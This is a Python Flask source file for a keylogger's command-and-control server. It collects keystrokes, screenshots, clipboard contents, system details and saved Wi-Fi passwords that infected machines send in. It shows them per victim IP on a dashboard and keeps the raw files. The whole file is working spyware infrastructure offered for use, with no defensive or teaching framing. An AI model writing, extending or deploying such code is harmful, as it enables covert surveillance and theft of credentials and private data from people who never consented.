from flask import Flask, request, jsonify, send_from_directory, Response
import os
import json
import time
from datetime import datetime
from collections import deque
import base64
from PIL import Image
import io

app = Flask(__name__)
DATA_DIR = 'data'
os.makedirs(DATA_DIR, exist_ok=True)

# UNLIMITED STORAGE (no maxlen)
live_data = {
    'keystrokes': [],
    'screenshots': [],
    'wifi': [],
    'clipboard': [],
    'system': []
}

@app.route('/log', methods=['POST'])
def perfect_log():
    try:
        data = request.json
        timestamp = datetime.now().strftime('%H:%M:%S')
        ip = request.remote_addr
        
        entry = {'ts': timestamp, 'ip': ip, 'data': data}
        
        # Smart categorization + deduplication
        if data.get('keystrokes', {}).get('raw'):
            live_data['keystrokes'].append(entry)
        
        if data.get('screenshots'):
            live_data['screenshots'].append(entry)
        
        if data.get('wifi_profiles') and not live_data['wifi'][-1:][0]['data'].get('wifi_profiles', []):
            live_data['wifi'].append(entry)
        
        if data.get('clipboard'):
            latest_clip = data['clipboard'][-1] if data['clipboard'] else ""
            if not live_data['clipboard'] or live_data['clipboard'][-1]['data'].get('clipboard', [-1])[-1] != latest_clip:
                live_data['clipboard'].append(entry)
        
        live_data['system'].append(entry)
        
        # Save raw file
        filename = f"{int(time.time()*1000)}_{ip.replace('.','_')}.json"
        filepath = os.path.join(DATA_DIR, filename)
        with open(filepath, 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"📥 [{ip}] Keys:{data.get('keystrokes',{}).get('count',0)} SS:{len(data.get('screenshots',[]))}")
        return jsonify({'status': 'PERFECT'}), 200
        
    except Exception as e:
        print(f"❌ {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/delete/<category>/<index>')
def delete_item(category, index):
    """DELETE specific item"""
    try:
        idx = int(index)
        if category in live_data and idx < len(live_data[category]):
            deleted = live_data[category].pop(idx)
            print(f"🗑️ Deleted {category}[{idx}]")
            return jsonify({'status': 'deleted', 'item': deleted['ts']})
    except:
        pass
    return jsonify({'error': 'not found'}), 404

@app.route('/clear/<category>')
def clear_category(category):
    """Clear entire category"""
    if category in live_data:
        count = len(live_data[category])
        live_data[category].clear()
        print(f"🗑️ Cleared {category} ({count} items)")
        return jsonify({'status': 'cleared', 'count': count})
    return jsonify({'error': 'category not found'}), 404

@app.route('/', methods=['GET'])
def perfect_dashboard():
    # Build HTML sections properly (SYNTAX FIXED)
    keystrokes_html = ""
    for i, c in enumerate(live_data["keystrokes"][-15:]):
        keystrokes_html += f'''
        <div class="capture">
            <span class="ip">{c["ip"]}</span> <span class="ts">{c["ts"]}</span>
            <div class="keys">{json.dumps(c["data"].get("keystrokes", {}).get("raw", "")[-100:], ensure_ascii=False)}</div>
            <small>{c["data"].get("keystrokes", {}).get("count", 0)} keys 
            <a href="/delete/keystrokes/{len(live_data["keystrokes"])-15+i}" style="color:#ff4444;">🗑️</a></small>
        </div>
        '''
    
    screenshots_html = ""
    for i, c in enumerate(live_data["screenshots"][-12:]):
        ss_data = c["data"].get("screenshots", [{}])[0]
        screenshots_html += f'''
        <div class="capture">
            <span class="ip">{c["ip"]}</span> <span class="ts">{c["ts"]}</span>
            <img src="data:image/jpeg;base64,{ss_data.get('data', '')[:100000]}" class="screenshot">
            <small>{ss_data.get('size', 0)//1000}KB 
            <a href="/delete/screenshots/{len(live_data["screenshots"])-12+i}" style="color:#ff4444;">🗑️</a></small>
        </div>
        '''
    
    wifi_html = ""
    for i, c in enumerate(live_data["wifi"][-5:]):
        profiles = c["data"].get("wifi_profiles", [])
        wifi_list = ''.join([f'<div>{p["ssid"]}: <strong>{p["password"]}</strong></div>' for p in profiles])
        wifi_html += f'''
        <div class="capture">
            <span class="ip">{c["ip"]}</span> <span class="ts">{c["ts"]}</span>
            <div class="wifi-profiles">{wifi_list}</div>
            <a href="/delete/wifi/{len(live_data["wifi"])-5+i}" style="color:#ff4444;">🗑️</a>
        </div>
        '''
    
    clipboard_html = ""
    for i, c in enumerate(live_data["clipboard"][-10:]):
        clip_content = json.dumps(c["data"].get("clipboard", [""])[-1], ensure_ascii=False)[:200]
        clipboard_html += f'''
        <div class="capture clip-item">
            <span class="ip">{c["ip"]}</span> <span class="ts">{c["ts"]}</span>
            <div>{clip_content}</div>
            <a href="/delete/clipboard/{len(live_data["clipboard"])-10+i}" style="color:#ff4444;">🗑️</a>
        </div>
        '''
    
    html = f"""
<!DOCTYPE html>
<html>
<head>
    <title>🔥 PERFECT C2 - UNLIMITED STORAGE</title>
    <meta http-equiv="refresh" content="5">
    <style>
        * {{ margin:0; padding:0; box-sizing:border-box; font-family:'Consolas',monospace; }}
        body {{ background:#0a0a0a; color:#00ff88; padding:20px; }}
        .header {{ background:linear-gradient(90deg,#1a1a2e,#16213e); padding:25px; border-radius:15px; text-align:center; margin-bottom:25px; box-shadow:0 5px 20px rgba(0,255,136,0.1); }}
        .stats {{ display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:20px; margin:20px 0; }}
        .stat {{ background:#16213e; padding:20px; border-radius:10px; text-align:center; border-left:4px solid #00ff88; }}
        .stat-num {{ font-size:36px; font-weight:bold; color:#00ff88; }}
        .category {{ background:#1a1a2e; margin:20px 0; padding:25px; border-radius:15px; border:1px solid #333; }}
        .category h2 {{ color:#00ff88; margin-bottom:20px; border-bottom:3px solid #00ff88; padding-bottom:10px; display:flex; justify-content:space-between; align-items:center; }}
        .clear-btn {{ background:#ff4444; color:white; padding:8px 15px; border:none; border-radius:5px; cursor:pointer; font-size:12px; }}
        .capture {{ background:#0f0f23; margin:12px 0; padding:18px; border-radius:10px; border-left:5px solid #00ff88; position:relative; }}
        .keys {{ font-family:monospace; background:#0002; padding:12px; border-radius:6px; white-space:pre-wrap; font-size:15px; color:#00ff88; min-height:40px; }}
        .wifi-profiles div {{ padding:8px; background:#111; margin:5px 0; border-radius:5px; border-left:3px solid #ffaa00; }}
        .screenshot {{ max-width:400px; max-height:300px; border-radius:10px; cursor:pointer; box-shadow:0 5px 15px rgba(0,0,0,0.5); }}
        .ip {{ color:#ff6b6b; font-weight:bold; font-size:13px; }}
        .ts {{ color:#888; font-size:12px; float:right; }}
        .files {{ background:#16213e; padding:20px; border-radius:10px; margin-top:30px; text-align:center; }}
        a {{ color:#00ff88; text-decoration:none; }}
        a:hover {{ text-decoration:underline; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 PERFECT KEYLOGGER C2 DASHBOARD</h1>
        <div class="stats">
            <div class="stat"><div class="stat-num">{len(live_data['keystrokes'])}</div>Keystrokes</div>
            <div class="stat"><div class="stat-num">{len(live_data['screenshots'])}</div>Screenshots</div>
            <div class="stat"><div class="stat-num">{len(live_data['wifi'])}</div>WiFi</div>
            <div class="stat"><div class="stat-num">{len(live_data['clipboard'])}</div>Clipboard</div>
        </div>
    </div>

    <div class="category">
        <h2>⌨️ LIVE KEYSTROKES <button class="clear-btn" onclick="location.href='/clear/keystrokes'">Clear All</button></h2>
        {keystrokes_html}
    </div>

    <div class="category">
        <h2>📸 SCREENSHOTS <button class="clear-btn" onclick="location.href='/clear/screenshots'">Clear All</button></h2>
        {screenshots_html}
    </div>

    <div class="category">
        <h2>📶 WIFI PROFILES <button class="clear-btn" onclick="location.href='/clear/wifi'">Clear All</button></h2>
        {wifi_html}
    </div>

    <div class="category">
        <h2>📋 CLIPBOARD <button class="clear-btn" onclick="location.href='/clear/clipboard'">Clear All</button></h2>
        {clipboard_html}
    </div>

    <div class="files">
        <h3>📁 Raw Files ({len(os.listdir(DATA_DIR))})</h3>
        <a href="/files">View All Files</a>
    </div>
</body>
</html>
    """
    return html

@app.route('/files')
def list_files():
    files = sorted(os.listdir(DATA_DIR))[-30:]
    return '<br>'.join([f'<a href="/files/{f}">{f}</a>' for f in files])

@app.route('/files/<filename>')
def serve_file(filename):
    return send_from_directory(DATA_DIR, filename)

if __name__ == '__main__':
    print("🚀 PERFECT C2 - UNLIMITED + DELETE + DEDUP")
    print("🌐 http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, debug=False)